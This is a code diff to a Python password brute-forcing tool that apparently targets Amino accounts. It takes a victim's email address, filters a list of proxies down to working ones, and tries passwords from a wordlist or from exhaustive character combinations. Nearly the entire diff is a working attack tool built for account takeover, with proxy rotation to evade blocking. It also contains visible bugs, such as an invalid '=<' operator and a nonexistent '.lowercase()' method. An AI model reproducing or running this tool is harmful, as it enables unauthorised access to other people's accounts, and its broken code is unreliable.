@@ -15,36 +15,6 @@ session = requests.session()
 
 print('Checking for updates ...')
 
-try:
-	_latestVersion = requests.get('')
-except:
-	pass # to be finished
-
-try:
-	proxies = open('proxies.txt','r')
-except:
-	print('Missing proxy file ...')
-	exit()
-
-try:
-	word_list = open('words.txt','r')
-except:
-	print('Missing word list ...')
-	exit()
-
-
-words_collection = word_list.readlines()
-length_wordList = len(words_collection)
-print('Word List Size: ' + str(length_wordList))
-
-
-proxy_collection = proxies.readlines()
-length_proxies = len(proxy_collection)
-
-print('Proxy List Size: ' + str(length_proxies))
-
-emailIsVaild = False
-
 if sys.platform.startswith('linux'):
 	def clear():
 		os.system('clear')
@@ -52,17 +22,63 @@ else:
 	def clear():
 		os.system('cls')
 
+
+try:
+	open('.git','r').close()
+	print('A git repository appears to be active --> Will try using \'git pull\'')
+	while True:
+		useGitPull = input('Would you like to update via \'git pull\'? (yes / no): ')
+		if useGitPull.lowercase().startswith('y'):
+			print('Okay, will pull latest commits from the repository now ...')
+			os.system('git pull')
+			break
+		elif useGitPull.lowercase().startswith('n'):
+			print('The latest commits will not be pulled in via \'git pull\'')
+			break
+		else:
+			print('Invaild Choice \'%s\''%str(useGitPull))
+			continue
+except:
+	print('[Info] -- > There is no current git repository in the active working directory\nIn-order to update you will need to replace the files manually.')
+
+try:
+	proxies = open('proxies.txt','r')
+	print('[Info] -- > Using proxy file \'proxies.txt\'')
+except:
+	print('[Fatal] -- > Missing proxy file \'proxies.txt\'!')
+	exit()
+
+try:
+	word_list = open('words.txt','r')
+	print('[Info] -- > Using words file \'words.txt\'')
+except:
+	print('[Fatal] -- > Missing words file \'words.txt\'!')
+	exit()
+
+
+	
+# Count how many words there are in the words file
+words_collection = word_list.readlines()
+length_wordList = len(words_collection)
+print('[Info] -- > Found %s words in the words file'%str(length_wordList))
+
+# Count how many proxies there are in the proxies file
+proxy_collection = proxies.readlines()
+length_proxies = len(proxy_collection)
+print('[Info] -- > Found %s proxies in the proxies file'%str(length_proxies))
+
 global emailToUse
 emailToUse = ''
-while emailIsVaild == False:
-	emailToUse = input('Email Address of Target: ')
+print('-- > Target Setup < --')
+while True:
+	emailToUse = input('[Email Address] :: ')
 	if len(emailToUse.replace(' ','')) == 0:
-		print('Email is blank, try again ...')
+		print('[Input Error] -- > The targets email cannot be blank !')
 	else:
-		emailIsVaild = True
+		print('[Info] -- > The target email addresss to use will be \'%s\''%str(emailToUse))
 		break
 
-print('Your proxy list will be now be checked ...') 
+print('\n[Task] -- > The proxies will now be tested !') 
 time.sleep(1)
 clear()
 global final_proxyCollection
@@ -102,24 +118,37 @@ def testProxy (proxy):
 
 
 print('Checking proxy list ('+str(length_proxies)+' proxies) ...')
-for proxy in proxy_collection:
-	proxy = proxy.replace('\n','')
-	lastProxyThread = str(proxy)
-	t = threading.Thread(target=testProxy,args=(proxy,))
 
-	t.start()
+# Proxy Tests :
+# --> Checks to see if any proxies in the proxies list are dead
+# --> If they are, they will not get added into the final listing
+ivari = 0
+for proxy in proxy_collection:
+	proxy = proxy.replace('\n','') # Remove the new line character from the proxy name (patch for previous issue)
+	lastProxyThread = str(proxy)
+	
+	vars()['t'+str(ivari)] = threading.Thread(target=testProxy,args=(proxy,))
+
+	vars()['t'+str(ivari)].start()
+	ivari += 1
 	time.sleep(.025)
 
+print('[Info] -- > Waiting for threads to finish any current tasks ...')
+vars()['t'+str(ivari-1)].join()
 
-while threading.active_count() > 1:
-	pass # hold the main thread until the threads finish up
-
-time.sleep(2)
 
 print('\n\nProxies Checked\n'+'-'*len('Proxies Checked'))
-print('Alive Proxies: ' + str(aliveProxies))
-print('Dead Proxies: ' + str(deadProxies))
+print('[Alive Proxies] :: ' + str(aliveProxies))
+print('[Dead Proxies] :: ' + str(deadProxies))
 
+if aliveProxies <= 2:
+	if aliveProxies > 0:
+		print('[Warning] -- > The number of alive proxies (%s) is very small !\nConsider adding more proxies to proxy file in-order to increase stability !')
+
+if aliveProxies =< 0:
+	clear()
+	print('[Error] --> There are no alive proxies to use !\nTroubleshooting Tips:\n  - Is your internet connection working?\n  - Do you have any proxies in the proxies file?\n  - Are the proxies being blocked by a firewall?\n  - Are the proxies correctly formatted and alive?\n\nPlease make sure that you go through the steps above before trying anything else.')
+	exit()
 
 while True:
 	try: method = int(input('Method (0 = Default, Any other number but 0 = Try Everything Mode): ')); break
@@ -148,17 +177,19 @@ def amino_pass(proxy, password,email):
 				break
 			except:
 				#print(final_proxyCollection)
+				print('[Proxy Error] -- > The proxy \'%s\' timed out or failed to connect, the thread will be restarted using another proxy !'%str(proxy))
 				proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
 				_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
 	except:
-		#print('[Thread with pass: ' +str(password)+'] Connection failed...')
+		print('[Proxy Error] -- > The proxy \'%s\' timed out or failed to connect and this exception loop was triggered (-1 :: Internal Error) !'%str(proxy))
 		return False
 
 	try: 
 		rQ.json()['result']
 	except:
 		#print(rQ.json())
-		#print('[Thread with pass: ' +str(password)+'] Instant failure !'); 
+		print('[Info] -- > Password was not \'%s\''%str(password) + ' !')
+		
 		return False
 
 	#print(rQ.json()['result'])
@@ -179,7 +210,7 @@ def amino_pass(proxy, password,email):
 		exit()
 		return True
 	else:
-		print(str(password)+' --> Incorrect Password')
+		print('[Info] -- > Password was not \'%s\''%str(password) + ' !')
 		return False
 
 if method == 0:
@@ -193,10 +224,12 @@ if method == 0:
 		time.sleep(0.075)
 
 	x.join()
-	print('Bruteforce Operation Completed!')
-	print('[INFO] Closing in 5 seconds ...')
+	print('[Alert] -- > All threads have been started')
+	print('[Info] -- > Closing in 5 seconds ...')
 	time.sleep(5)
 else:
+	
+	"""This will be optimized soon."""
 	print('Password Crack Attempt with Length of 1 ...')
 	for i in range(0,len(list(string.printable))-1):
 		proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
